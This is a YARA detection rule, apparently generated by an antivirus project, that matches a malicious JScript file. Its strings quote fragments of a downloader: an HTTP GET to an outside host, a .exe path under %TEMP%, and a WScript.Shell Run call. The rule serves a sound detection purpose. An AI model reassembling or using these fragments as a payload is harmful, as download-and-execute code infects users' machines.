rule sig_20160329_32c52da3d2882404591e998dc0c4229e {
  meta:
    description = "datamaliciousorder - file 20160329_32c52da3d2882404591e998dc0c4229e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "971bd53c106c8cbf508475df18a8326b2fb5498e28eecb4441530eabb8f1488f"

  strings:
    $s1  = "fv[I](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function pM() {return m[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7qoIha2hv883ovyn.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ep](vg() * 11); if (fv[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function E0(s, N){cH = cH * 1; return s - N;};" fullword ascii
    $s5  = "var m = function H() {return WScript[Y0](\"WScript.Shell\");}(), Hk = 11;" fullword ascii
    $s6  = "function NC(){return \"\" + JM;};" fullword ascii
    $s7  = "function M(b){m[\"Run\"](b, cH, cH);};" fullword ascii
    $s8  = "function CO() {return ((qd == true) && (qd == D)) ? 1 : cH;};" fullword ascii
    $s9  = "function E(){return Y0;};" fullword ascii
    $s10 = " while (f){" fullword ascii
    $s11 = "function Wf()" fullword ascii
    $s12 = "function vg(){return 22;};" fullword ascii
    $s13 = "return E0(Q, W0);" fullword ascii
    $s14 = "var wL = new this[\"Date\"]();" fullword ascii
    $s15 = "function Y(mn) {var HQ = (1, 2, 3, 4, 5, mn); return HQ;};" fullword ascii
    $s16 = "var qd = false;" fullword ascii
    $s17 = "var yN = false;" fullword ascii
    $s18 = "qd = true; " fullword ascii
    $s19 = "} catch(F){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}